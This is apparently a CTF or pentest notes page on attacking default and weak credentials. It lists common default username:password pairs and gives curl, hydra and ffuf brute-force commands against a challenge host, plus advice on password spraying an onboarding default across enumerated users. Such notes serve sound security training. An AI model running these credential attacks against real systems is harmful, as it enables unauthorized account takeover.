# Default / weak credentials (CWE-1392, CWE-521)

**Signs**: device/admin console (router, printer, CMS, Tomcat, Jenkins), HTTP Basic popup
(`401` + `WWW-Authenticate: Basic`), hint "never changed since birth", "one basic word".

## 1. Confirm the challenge
```bash
curl -si $T/admin | head -5            # 401 + WWW-Authenticate: Basic realm="..."
```

## 2. Try the obvious (by hand, 30 s)
`admin:admin` `admin:password` `admin:admin123` `admin:12345` `admin:1234` `root:root`
`admin:` (empty) `user:user` `guest:guest` `test:test` `<product>:<product>`
Also the product's documented default (search "<product> default password").

## 3. Small dictionary
```bash
# HTTP Basic, user:pass combo list
python scripts/auth/basic_auth_brute.py $T/admin -C wordlists/passwords/default-creds-combo.txt
hydra -C wordlists/passwords/default-creds-combo.txt -s 8060 auth1.chal.deti http-get /admin
ffuf -u $T/admin -H 'Authorization: Basic FUZZ' -w <(python scripts/auth/basic_b64.py wordlists/passwords/default-creds-combo.txt) -mc 200
```
Form login → [brute-force](brute-force.md).

Wordlists: `wordlists/passwords/default-creds-combo.txt` (user:pass),
`wordlists/usernames/top-usernames-shortlist.txt`, `wordlists/passwords/top-100.txt`.

## Shared onboarding default
Orgs give every new account the same password (`Welcome1`, `admin123`, `Company2024!`) and someone
never changed it → enumerate valid users first ([user-enumeration](user-enumeration.md)), then spray
the default across all of them (password spraying, CAPEC-565).

Seen in: `auth1` (Basic `admin:admin123`), `auth10` (onboarding default `admin123` for one HR admin),
DVWA `admin:password`, bWAPP `bee:bug`.
